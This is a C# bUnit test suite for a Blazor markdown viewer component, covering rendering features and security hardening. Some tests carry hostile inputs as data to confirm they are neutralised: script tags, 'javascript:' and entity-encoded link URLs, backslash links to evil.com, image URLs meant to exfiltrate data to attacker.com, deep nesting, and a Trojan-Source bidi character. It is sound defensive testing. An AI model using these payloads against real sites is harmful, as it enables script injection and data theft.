using Bunit;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System;
using System.Linq;

namespace Bit.BlazorUI.Tests.Components.Extras.MarkdownViewer;

[TestClass]
public class BitMarkdownViewerTests : BunitTestContext
{
    [TestMethod]
    public void BitMarkdownViewerShouldRenderExpectedClass()
    {
        var component = RenderComponent<BitMarkdownViewer>();

        var root = component.Find(".bit-mdv");

        Assert.IsNotNull(root);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderHeading()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# hello");
        });

        var root = component.Find(".bit-mdv");

        Assert.Contains("<h1>hello</h1>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderInlineFormatting()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "a **bold** and *italic* word");
        });

        var root = component.Find(".bit-mdv");

        Assert.Contains("<strong>bold</strong>", root.InnerHtml);
        Assert.Contains("<em>italic</em>", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldTreatRawHtmlAsText()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "<script>alert(1)</script>");
        });

        var root = component.Find(".bit-mdv");

        // Raw HTML must be escaped (rendered as text), never as live markup.
        Assert.DoesNotContain("<script>", root.InnerHtml);
        Assert.Contains("&lt;script&gt;", root.InnerHtml);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUnsafeLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[click](javascript:alert(1))");
        });

        // Validate the rendered link's actual href rather than a substring of the HTML.
        // Removing the unsafe node entirely is also a valid (secure) sanitizer outcome.
        var links = component.FindAll(".bit-mdv a");
        if (links.Count > 0)
        {
            var href = links[0].GetAttribute("href") ?? string.Empty;
            Assert.IsTrue(
                href.Length == 0 || !href.Contains("javascript:", StringComparison.OrdinalIgnoreCase),
                $"Unsafe link href was not sanitized: '{href}'.");
        }
    }

    [TestMethod,
        DataRow(@"\\evil.com"),
        DataRow(@"/\evil.com"),
        DataRow(@"\/evil.com")]
    public void BitMarkdownViewerShouldSanitizeBackslashLinks(string url)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            // Browsers treat leading backslashes like slashes (protocol-relative),
            // including mixed separator runs (BitMarkdownUrlSanitizer).
            parameters.Add(p => p.Markdown, $"[click]({url})");
        });

        var links = component.FindAll(".bit-mdv a");
        if (links.Count > 0)
        {
            var href = links[0].GetAttribute("href") ?? string.Empty;
            var leadingSeparators = href.TakeWhile(c => c is '/' or '\\');
            Assert.IsTrue(
                href.Length == 0 || !leadingSeparators.Contains('\\'),
                $"Backslash link href was not sanitized: '{href}'.");
        }
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUnsafeImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![alt](javascript:alert(1))");
        });

        // Validate the rendered image's actual src rather than a substring of the HTML.
        // Removing the unsafe node entirely is also a valid (secure) sanitizer outcome.
        var imgs = component.FindAll(".bit-mdv img");
        if (imgs.Count > 0)
        {
            var src = imgs[0].GetAttribute("src") ?? string.Empty;
            Assert.IsTrue(
                src.Length == 0 || !src.Contains("javascript:", StringComparison.OrdinalIgnoreCase),
                $"Unsafe image src was not sanitized: '{src}'.");
        }
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenMarkdownChanges()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# one");
        });

        Assert.Contains("<h1>one</h1>", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.Markdown, "# two");
        });

        Assert.Contains("<h1>two</h1>", component.Markup);
        Assert.DoesNotContain("<h1>one</h1>", component.Markup);
    }

    [TestMethod,
        DataRow(true),
        DataRow(false)]
    public void BitMarkdownViewerShouldRespectIsEnabled(bool isEnabled)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.IsEnabled, isEnabled);
            parameters.Add(p => p.Markdown, "enable");
        });

        var root = component.Find(".bit-mdv");

        if (isEnabled)
        {
            Assert.IsFalse(root.ClassList.Contains("bit-dis"));
        }
        else
        {
            Assert.IsTrue(root.ClassList.Contains("bit-dis"));
        }
    }

    [TestMethod]
    public void BitMarkdownViewerBasicPipelineShouldNotRenderTables()
    {
        var markdown = "| a | b |\n|---|---|\n| 1 | 2 |";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.DoesNotContain("<table", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerGitHubPipelineShouldRenderGfmFeatures()
    {
        var markdown = "~~gone~~\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var markup = component.Markup;

        Assert.Contains("<del>gone</del>", markup);
        Assert.Contains("<table", markup);
        Assert.Contains("type=\"checkbox\"", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerAdvancedPipelineShouldRenderEmojiAndHeadingIds()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# Hello World :rocket:");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;

        Assert.Contains("🚀", markup);
        Assert.Contains("id=\"hello-world\"", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenPipelineChanges()
    {
        var markdown = "~~gone~~";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.DoesNotContain("<del>gone</del>", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.Contains("<del>gone</del>", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockRemoteImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        // No src means the browser never issues the cross-origin (exfiltration) request.
        var src = imgs[0].GetAttribute("src") ?? string.Empty;
        Assert.AreEqual(string.Empty, src);
        // Alt text is preserved for accessibility.
        Assert.AreEqual("leak", imgs[0].GetAttribute("alt"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepRelativeImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("/assets/logo.png", imgs[0].GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepAbsoluteSameOriginImagesInSameOriginMode()
    {
        // bUnit's test host resolves to http://localhost/, so an absolute URL that points
        // back at that origin must NOT be blocked under the SameOrigin policy.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](http://localhost/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("http://localhost/assets/logo.png", imgs[0].GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockRemoteImagesByDefault()
    {
        // ImageRendering defaults to the safe SameOrigin policy, so a cross-origin image
        // is blocked even when the parameter is not set explicitly.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/leak?data=secret)");
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockProtocolRelativeImagesInSameOriginMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](//attacker.com/a.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockAllImagesInNoneMode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![local](/assets/logo.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.None);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual(string.Empty, imgs[0].GetAttribute("src") ?? string.Empty);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldAddNoReferrerToImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![x](https://example.com/a.png)");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
        });

        var imgs = component.FindAll(".bit-mdv img");
        Assert.AreEqual(1, imgs.Count);
        Assert.AreEqual("https://example.com/a.png", imgs[0].GetAttribute("src"));
        Assert.AreEqual("no-referrer", imgs[0].GetAttribute("referrerpolicy"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotOverflowOnDeeplyNestedInput()
    {
        // Without a depth limit this triggers an (uncatchable) StackOverflowException
        // that would crash the host. The depth guard must keep it bounded.
        var markdown = new string('>', 5000) + " boom";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.Contains("boom", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStripBidiControlCharactersWhenEnabled()
    {
        // U+202E (RIGHT-TO-LEFT OVERRIDE) is a Trojan-Source spoofing character.
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.StripBidiControlCharacters, true);
        });

        Assert.DoesNotContain("\u202E", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepBidiControlCharactersByDefault()
    {
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.Contains("\u202E", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenHardeningOptionsChange()
    {
        // The component caches the parsed AST and only re-parses when an output-affecting
        // input changes. Toggling the hardening options after the first render must
        // invalidate that cache instead of reusing stale state.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![leak](https://attacker.com/a.png)\n\n# hello world");
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.All);
        });

        // First render: All policy keeps the remote image and the full heading text.
        Assert.AreEqual("https://attacker.com/a.png", component.FindAll(".bit-mdv img")[0].GetAttribute("src"));
        Assert.Contains("<h1>hello world</h1>", component.Markup);

        // Tighten ImageRendering and cap the length; the cached AST must be rebuilt.
        component.Render(parameters =>
        {
            parameters.Add(p => p.ImageRendering, BitMarkdownViewerImageRendering.SameOrigin);
            parameters.Add(p => p.MaxLength, 38); // truncates before "world"
        });

        Assert.AreEqual(string.Empty, component.FindAll(".bit-mdv img")[0].GetAttribute("src") ?? string.Empty);
        Assert.DoesNotContain("world", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReparseWhenStripBidiToggles()
    {
        var markdown = "a\u202Eb";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        // Default keeps the bidi control character.
        Assert.Contains("\u202E", component.Markup);

        component.Render(parameters =>
        {
            parameters.Add(p => p.StripBidiControlCharacters, true);
        });

        Assert.DoesNotContain("\u202E", component.Markup);
    }

    [TestMethod,
        DataRow("۱."),          // Extended Arabic-Indic (Persian) digit one
        DataRow("١."),          // Arabic-Indic digit one
        DataRow("१."),          // Devanagari digit one
        DataRow("１."),          // Fullwidth digit one
        DataRow("۱) item"),
        DataRow("۱. item")]
    public void BitMarkdownViewerShouldNotTreatNonAsciiDigitsAsOrderedListMarkers(string markdown)
    {
        // .NET's \d matches every Unicode decimal digit, so these lines used to be taken
        // for ordered list markers and then fed to int.Parse, which throws (only ASCII
        // digits parse). CommonMark restricts the marker to ASCII digits, so they must
        // render as ordinary paragraph text.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        var markup = component.Markup;

        Assert.DoesNotContain("<ol", markup);
        Assert.Contains(markdown[..1], markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStillRenderAsciiOrderedLists()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "3. three\n4. four");
        });

        var markup = component.Markup;

        Assert.Contains("<ol", markup);
        Assert.Contains("start=\"3\"", markup);
        Assert.AreEqual(2, component.FindAll(".bit-mdv ol li").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRespectMaxLength()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# hello world");
            parameters.Add(p => p.MaxLength, 3); // "# h"
        });

        var markup = component.Markup;
        Assert.Contains("<h1>h</h1>", markup);
        Assert.DoesNotContain("hello", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotSplitSurrogatePairsWhenTruncating()
    {
        // "# " + a rocket, whose emoji occupies two chars. Cutting at 3 would leave a lone
        // high surrogate, which renders as a replacement character.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# \U0001F680 boom");
            parameters.Add(p => p.MaxLength, 3);
        });

        Assert.DoesNotContain("�", component.Markup);
    }

    // -- Link reference definitions and reference links ----------------------

    [TestMethod]
    public void BitMarkdownViewerShouldResolveFullReferenceLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "See [the docs][docs].\n\n[docs]: https://bitplatform.dev \"bit\"");
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("https://bitplatform.dev", link.GetAttribute("href"));
        Assert.AreEqual("bit", link.GetAttribute("title"));
        Assert.AreEqual("the docs", link.TextContent);
        // The definition itself is not part of the rendered document.
        Assert.DoesNotContain("[docs]:", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveCollapsedAndShortcutReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[bit][] and [bit].\n\n[bit]: https://bitplatform.dev");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(2, links.Count);
        Assert.AreEqual("https://bitplatform.dev", links[0].GetAttribute("href"));
        Assert.AreEqual("https://bitplatform.dev", links[1].GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveReferencesDefinedBeforeUse()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[bit]: https://bitplatform.dev\n\nGo to [bit].");
        });

        Assert.AreEqual("https://bitplatform.dev", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldMatchReferenceLabelsCaseAndWhitespaceInsensitively()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[Hello   World]\n\n[hello world]: /x");
        });

        Assert.AreEqual("/x", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldResolveReferenceImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![a cat][cat]\n\n[cat]: /cat.png");
        });

        var img = component.Find(".bit-mdv img");

        Assert.AreEqual("/cat.png", img.GetAttribute("src"));
        Assert.AreEqual("a cat", img.GetAttribute("alt"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeReferenceDefinitionUrls()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[click][evil]\n\n[evil]: javascript:alert(1)");
        });

        var link = component.Find(".bit-mdv a");

        Assert.IsFalse(link.HasAttribute("href"));
        Assert.DoesNotContain("javascript:", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveUnresolvedReferencesAsText()
    {
        // The document defines "b", so the pre-scan is active, yet "[a]" has no definition
        // and must read exactly as it was written.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a] then [b]\n\n[b]: /b");
        });

        var markup = component.Markup;

        Assert.Contains("[a] then", markup);
        Assert.AreEqual(1, component.FindAll(".bit-mdv a").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotTreatBracketedTextAsReferenceWithoutDefinitions()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "see [1] and [note] here");
        });

        var markup = component.Markup;

        Assert.Contains("[1] and [note] here", markup);
        Assert.AreEqual(0, component.FindAll(".bit-mdv a").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepTaskListsWorkingAlongsideReferenceDefinitions()
    {
        // The definition switches the reference machinery on; the "[ ]" and "[x]" markers
        // must still reach the task-list processor as one text run.
        var markdown = "- [x] done\n- [ ] todo\n\n[ref]: /r";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv input[type=checkbox]").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotReadIndentedDefinitionsAsDefinitions()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "    [a]: /a");
        });

        // Four spaces make it an indented code block, not a definition.
        Assert.Contains("<pre>", component.Markup);
        Assert.Contains("[a]: /a", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReadTitleOnTheLineAfterTheDestination()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a]\n\n[a]: /url\n   \"the title\"");
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("/url", link.GetAttribute("href"));
        Assert.AreEqual("the title", link.GetAttribute("title"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldUseTheFirstOfSeveralDefinitionsOfALabel()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a]\n\n[a]: /first\n\n[a]: /second");
        });

        Assert.AreEqual("/first", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    // -- Entity and numeric character references -----------------------------

    [TestMethod]
    [DataRow("&copy;", "©")]
    [DataRow("&#169;", "©")]
    [DataRow("&#xA9;", "©")]
    [DataRow("&hellip;", "…")]
    [DataRow("&mdash;", "—")]
    public void BitMarkdownViewerShouldDecodeCharacterReferences(string markdown, string expected)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
        });

        Assert.AreEqual(expected, component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldEscapeTextDecodedFromCharacterReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "&lt;script&gt;alert(1)&lt;/script&gt;");
        });

        // The decoded characters are text, so they are escaped again on the way to the DOM
        // and can never become live markup.
        Assert.DoesNotContain("<script>", component.Markup);
        Assert.AreEqual("<script>alert(1)</script>", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveUnknownAndMalformedReferencesAlone()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "&nosuchentity; &#; AT&T");
        });

        Assert.AreEqual("&nosuchentity; &#; AT&T", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotDecodeCharacterReferencesInsideCode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "`&copy;`\n\n```\n&copy;\n```");
        });

        Assert.AreEqual("&copy;", component.Find(".bit-mdv code").TextContent);
        Assert.AreEqual("&copy;", component.Find(".bit-mdv pre code").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldReplaceOutOfRangeNumericReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "&#0; &#xD800;");
        });

        Assert.AreEqual("� �", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldSanitizeUrlsAfterDecodingCharacterReferences()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[x](&#x6A;avascript:alert(1))");
        });

        Assert.IsFalse(component.Find(".bit-mdv a").HasAttribute("href"));
    }

    // -- Footnotes -----------------------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldRenderFootnotes()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Text with a note[^1].\n\n[^1]: The note itself.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;
        var scope = component.Instance.UniqueId;

        Assert.Contains("class=\"footnote-ref\"", markup);
        Assert.Contains($"href=\"#{scope}-fn-1\"", markup);
        Assert.Contains($"id=\"{scope}-fnref-1\"", markup);
        Assert.Contains($"id=\"{scope}-fn-1\"", markup);
        Assert.Contains("The note itself.", markup);
        Assert.Contains("class=\"footnote-backref\"", markup);
        // The definition is lifted out of the flow into the footnotes section.
        Assert.DoesNotContain("[^1]:", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNumberFootnotesByOrderOfReference()
    {
        var markdown = "First[^b] then second[^a].\n\n[^a]: A.\n[^b]: B.";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var items = component.FindAll(".bit-mdv .footnotes li");

        Assert.AreEqual(2, items.Count);
        Assert.Contains("B.", items[0].TextContent);
        Assert.Contains("A.", items[1].TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldGiveEachFootnoteCitationItsOwnBackLink()
    {
        var markdown = "One[^n] and two[^n].\n\n[^n]: The note.";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;
        var scope = component.Instance.UniqueId;

        Assert.Contains($"id=\"{scope}-fnref-1\"", markup);
        Assert.Contains($"id=\"{scope}-fnref-1-2\"", markup);
        Assert.AreEqual(2, component.FindAll(".bit-mdv .footnote-backref").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldScopeFootnoteIdsToTheInstance()
    {
        const string markdown = "Text with a note[^1].\n\n[^1]: The note itself.";

        var first = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });
        var second = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        // Two viewers on one page must not emit the same ids, or a reference in one would
        // jump into the other's notes.
        Assert.AreNotEqual(
            first.Find(".bit-mdv .footnotes").Id,
            second.Find(".bit-mdv .footnotes").Id);
        Assert.AreEqual(
            $"#{first.Find(".bit-mdv .footnote-item").Id}",
            first.Find(".bit-mdv .footnote-ref a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldDropFootnoteDefinitionsNobodyCites()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Just text.\n\n[^unused]: Nothing points here.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var markup = component.Markup;

        Assert.DoesNotContain("class=\"footnotes\"", markup);
        Assert.DoesNotContain("Nothing points here.", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotRenderFootnotesWithoutTheExtension()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Text[^1].\n\n[^1]: The note.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Basic);
        });

        Assert.DoesNotContain("class=\"footnote-ref\"", component.Markup);
        Assert.DoesNotContain("class=\"footnotes\"", component.Markup);
    }

    // -- Alerts --------------------------------------------------------------

    [TestMethod]
    [DataRow("NOTE", "note", "Note")]
    [DataRow("TIP", "tip", "Tip")]
    [DataRow("IMPORTANT", "important", "Important")]
    [DataRow("WARNING", "warning", "Warning")]
    [DataRow("CAUTION", "caution", "Caution")]
    public void BitMarkdownViewerShouldRenderGitHubAlerts(string marker, string cssKind, string title)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"> [!{marker}]\n> Something worth knowing.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        var alert = component.Find($".bit-mdv .markdown-alert-{cssKind}");

        Assert.AreEqual(title, component.Find(".bit-mdv .markdown-alert-title").TextContent);
        Assert.Contains("Something worth knowing.", alert.TextContent);
        Assert.AreEqual(0, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLeaveOrdinaryBlockquotesAlone()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> just a quote");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.AreEqual(1, component.FindAll(".bit-mdv blockquote").Count);
        Assert.AreEqual(0, component.FindAll(".bit-mdv .markdown-alert").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotTreatAMarkerFollowedByTextAsAnAlert()
    {
        // GitHub requires the marker to be alone on the first line.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> [!NOTE] inline text");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .markdown-alert").Count);
        Assert.AreEqual(1, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotRenderAlertsWithoutTheExtension()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> [!NOTE]\n> Something.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Basic);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv .markdown-alert").Count);
        Assert.AreEqual(1, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerGitHubPipelineShouldCarryFootnotesAndAlerts()
    {
        // A footnote definition is also a valid link reference definition, so a pipeline
        // with the rest of the GitHub flavors must carry footnotes too - otherwise the note
        // silently becomes a link destination.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Text[^1].\n\n[^1]: The note.\n\n> [!TIP]\n> Do this.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.Contains("class=\"footnote-ref\"", component.Markup);
        Assert.AreEqual(1, component.FindAll(".bit-mdv .markdown-alert-tip").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepUnresolvedFootnoteReferencesAsWritten()
    {
        // "[^b]" has no definition; "[^a]" does, which is what turns the pre-scan on.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "One[^a] two[^B].\n\n[^a]: A note.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
        });

        Assert.Contains("two[^B].", component.Markup);
        Assert.AreEqual(1, component.FindAll(".bit-mdv .footnote-ref").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotNestLinksInsideReferenceLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[[inner]][outer]\n\n[inner]: /i\n[outer]: /o");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(1, links.Count);
        Assert.AreEqual("/o", links[0].GetAttribute("href"));
        // The inner link is unwrapped; its content survives as the outer link's text.
        Assert.AreEqual("inner", links[0].TextContent);
    }

